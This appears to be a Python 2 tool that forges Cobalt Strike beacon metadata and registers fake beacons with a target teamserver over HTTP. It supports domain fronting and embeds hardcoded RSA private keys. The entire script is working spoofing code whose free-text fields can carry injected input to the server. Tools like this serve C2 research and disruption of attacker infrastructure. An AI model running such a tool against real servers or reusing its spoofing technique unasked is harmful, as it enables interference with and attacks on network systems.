import random
import base64
import argparse

import requests

from pybeacon.metadata import Metadata


def register_beacon(m, ipaddr, uri, host=""):
    headers = {'Cookie': m }
    if host:
        headers['Host'] = host
    requests.get('http://%s/%s' % (ipaddr, uri), headers = headers)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Beacon registration tool')
    parser.add_argument('-t', '--teamserver', help='Target Teamserver IP address', required=True)
    parser.add_argument('--host', help='Optional host header (for Domain Fronting)', required=False)
    parser.add_argument('--uri', help='Checkin (GET) URI', default='__utm.gif', required=False)
    parser.add_argument('--computer', help='Computer name to use', required=True)
    parser.add_argument('-i', '--ip-address', help='IP address to use', required=True)
    parser.add_argument('-u', '--user', help='Username to use', required=True)
    parser.add_argument('-p', '--proc', help='Process name to use', required=True)
    parser.add_argument('-v3', help="Whether the target server is CS 3.0", action='store_true', default=False)
    parser.add_argument('-b', '--bid', help='Beacon ID to use', type=int, default=random.randint(1, 0x7fffffff), required=False)
    parser.add_argument('--pid', help='PID to use', type=int, default=random.randint(1, 0x7fffffff), required=False)
    parser.add_argument('-k', '--public-key', help='Public key as base64 string', required=True)
    args = parser.parse_args()

    if args.v3:
        m = Metadata(base64.b64decode('hwRRv0U1CkZSU5AOMHSNc6bvL73DpX2L6jrb5oWZeQwFD6TKJkJFF0Vri+0j8zTpxX9cjfbmcCQAGpqT23ZSB2A/p+3Oll5YnurDTSUDWKvCXzBdpUqgBg3GfsHj8dl549D1uYGhtDDrLFJ7Q/9OCCnjxJpm6heeaV4Bh+x07X8='),
        'MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJVY4v8Qezfp4pSArCfw0ACTqi3pCFGAuWYFmhTV/iENgcnpIBKWLblEo6CduZTyOdmzUIYT8To5uxFUnYKcrkTY7ucAspznyLxpcFFgL2CcHZlnVvblxdbU3uVvMp2vWMkhI5nU/tW9uD2JhNerbCHWrsRCC70T9C2AnE4gh9wXAgMBAAECgYBcrEJ3WefMA2LpGYs6YZEAuqCgSnkx8fmZmCJLiZpfMj12aCXRwsTusOwEL7tH9KL3NvDhsiA/LDGriGEQ+l6cQInKg2rBZSLgH9OTIWXVrsid15WonZxnw1hpQGJtJdmI9DH15Zux4zBiwOM5p9nF7pOdSs4XJZpQYkhthZlL0QJBANXPjrJrV3rOMS2zuqze3xKNoUjtPwv7hwj0p7NmCtETGwiWNpgv/egicw7lOcKgOeKXQPyvy2IpsRNyIb1Ye0kCQQCy0QP7h04wZmBIw1MaxgVodhLlhyVrm7UNvbTTAsu17ExUWW2J9mKnLseH/Oy1x2TWoK6sKsyTGygtIGecZTxfAkEAxnApt0xK165xFEKf+furu9N5Im8Wua9Lp7Mxxh3p4hvCVljb+KlqFT2L3gI/dnQw5S2OYjdiIwwgzbR6vfpWCQJAEiATqkRNzaQi8F00KEuYMr19LtzjEyRGVu06zgTDh147YnVqIAjkeRPJz+P4Tni2pPbGndb8w5CGIwTc28J7OwJBAKcvu9cKP+wvwk3fTFSctNhxErTzSCgBOzSKm3hNxau5ZpQ7R782pxw0/os5PNkBaJZvSqEZ0oER3Yiq7mCOocw=',
        cs_version=3)
        if args.uri == '__utm.gif':
            args.uri = 'pixel'
    else:
        m = Metadata(
            base64.b64decode('iMEqKb7V1aWwwr61GoFw+EFER8CFvejciH5XD3rwmlujIHkQiFvxFn5lC/spTT1JGOC++BQDEbXsH1tijkkAVswhoW9sN8z/pL5jCLkjIJ0dky9dWprwo/2dVkvrESEObrzSe8jzeaKCytAtm3/DoR6f+nRfgaoA4MCxbBi8uY8='),
            'MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAOE58LhMgJ6+tuCJRUrmSa9Txo1A2IJ9xwfEg5XjDOM6fkOloLj00ugoyxLZ9Wcwj9/5xvK6p+tcxiZRfx5kNaSZ+WsEU048byGvyiqGbUSIi8r1L4Kw64sawQ6Z5+piT4aPWd+cnW470QtG/VT46GZDvvDi7QBlYc9I2vVJNiFlAgMBAAECgYBfHZYAbyZ+Y/JdfvtJd1m09n9KlhEZgr60FBSyDxIZQFGkheULVzFepCOm0W9m5cZNA3I2fgd+SU7RTeeOUSmpkBp81Pq+TeFLMAgWVRtiGNPwR1CGiU4H18s8trQN9C6OY2f+d6ZMXVxPHI52SEwLq5fGjcg5ZguX74Qx34jJQQJBAPPYCd5vALwlh9f9G59fWnjZ8tJ34I1q5m641+b5kp5npjj8TAiItMqlM1O3C3ypL5kpvmSZjs0jlHoOU0Be9NUCQQDsdE1ntzClX2ko19Sg6IjywKSAkwshyT3dYxE/f6px4p4HEyV+VmCrAKTNLfixU70VkXyfnf5VXm13dF68vQJRAkAWW5OkEnd1yNcoxatXtI1+ETXDeHxdWxTfyBD7u5xm68gA55ktGyPAhN8s6NajyntzxrEPVkkSpBWED3Ywq8Q1AkEAt5cxxpa5AZ4MI3c5E9qZAorK7z28hfYfv7Y83SW97ID9HBckpGxi0ENGsjzAfMa86HM25SQiJpyTuA01xaunkQJACXKKA8lffC/fqaymbEpBaL51iefuBYJbYNPuiJzgwWyEdyuFjt5/dTQCJPscgfOnfCpujdeP65x0iGXwuIdkLA=='
            )

    m.intz = args.ip_address
    m.comp = args.computer
    m.user = args.user
    m.proc = args.proc
    m.bid = args.bid
    m.public_key = args.public_key
    m.pid = args.pid
    m.print_config()
    enc = m.pack()
    
    print "Sending metadata blob: %s" % enc
    register_beacon(enc, args.teamserver, args.uri, host=args.host)
